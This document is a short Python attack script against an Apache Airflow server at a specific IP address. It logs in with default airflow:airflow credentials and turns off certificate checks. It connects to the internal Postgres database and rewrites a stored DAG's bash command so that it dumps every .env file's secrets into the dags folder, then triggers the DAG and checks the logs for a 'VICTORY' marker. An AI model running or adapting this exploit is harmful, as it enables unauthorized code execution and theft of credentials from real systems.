import subprocess, json, ssl, base64, time, urllib.request, urllib.error

e = {"PGPASSWORD": "airflow", "PATH": "/usr/bin:/bin"}
BASE = "http://84.46.251.240:8080"
AUTH = base64.b64encode(b"airflow:airflow").decode()

ssl._create_default_https_context = ssl._create_unverified_context

def api_post(path, data):
    url = f"{BASE}/api/v1/{path}"
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, method="POST",
        headers={"Authorization": f"Basic {AUTH}", "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode())

# Step 1: UPDATE serialized_dag (same as before)
sql = """UPDATE serialized_dag SET data = replace(data::text, 'python -c \\"import ccxt; print(ccxt.__version__)\\"', 'id > /opt/airflow/dags/_v.txt 2>&1; find /opt/airflow -name .env -exec cat {} + >> /opt/airflow/dags/_v.txt 2>&1; echo VICTORY >> /opt/airflow/dags/_v.txt')::jsonb WHERE dag_id = 'bash'"""

r = subprocess.run(["psql", "-h", "172.18.0.2", "-U", "airflow", "-d", "airflow", "-c", sql],
    env=e, capture_output=True, text=True, timeout=10)
print("UPDATE:", r.stdout.strip())

# Step 2: IMMEDIATELY trigger DAG (within seconds!)
run = api_post("dags/bash/dagRuns", {"conf": {}})
run_id = run["dag_run_id"]
print(f"TRIGGERED: {run_id}")

# Step 3: Wait for execution
time.sleep(25)

# Step 4: Check logs
log_url = f"{BASE}/api/v1/dags/bash/dagRuns/{run_id}/taskInstances/check/logs/1"
req = urllib.request.Request(log_url, headers={"Authorization": f"Basic {AUTH}", "Accept": "text/plain"})
try:
    with urllib.request.urlopen(req, timeout=10) as r:
        logs = r.read().decode()
    for line in logs.split("\n"):
        if "Running command" in line or "VICTORY" in line:
            print(f"LOG: {line.strip()[:200]}")
except Exception as ex:
    print(f"LOG ERROR: {ex}")
